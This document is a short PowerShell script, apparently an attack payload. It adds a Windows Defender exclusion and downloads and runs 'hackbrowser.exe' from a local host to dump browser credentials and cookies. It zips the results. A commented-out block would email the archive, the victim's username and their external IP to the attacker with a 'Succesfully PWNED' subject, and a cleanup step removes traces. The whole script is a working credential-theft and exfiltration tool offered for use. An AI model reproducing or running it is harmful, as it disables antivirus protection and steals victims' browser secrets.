#Adding windows defender exclusionpath
Add-MpPreference -ExclusionPath "C:\Users"
#Creating the directory we will work on
mkdir "C:\Users\dump"
Set-Location "C:\Users\dump"
#Downloading and executing hackbrowser.exe
Invoke-WebRequest 'http://192.168.0.103/hackbrowser.exe' -OutFile "hb.exe"
.\hb.exe --format json
Remove-Item -Path "C:\Users\hb.exe" -Force
#Creating A Zip Archive
Compress-Archive -Path * -DestinationPath dump.zip
$Random = Get-Random
#Mailing the output you will need to enable less secure app access on your google account for this to work
#$Message = new-object Net.Mail.MailMessage
#$smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", 587)
#$smtp.Credentials = New-Object System.Net.NetworkCredential("your email address", "your email password");
#$smtp.EnableSsl = $true
#$Message.From = "your email address"
#$Message.To.Add("your email address")
#$ip = Invoke-RestMethod "myexternalip.com/raw"
#$Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
#$ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
#$Message.Body = $ComputerName
#$files=Get-ChildItem 
#$Message.Attachments.Add("$env:appdata\Microsoft\dump\dump.zip")
#$smtp.Send($Message)
#$Message.Dispose()
#$smtp.Dispose()
#Cleanup
cd "C:\Users"
#Remove-Item -Path "C:\Users\dump" -Force -Recurse
#Remove-MpPreference -ExclusionPath "C:\Users"
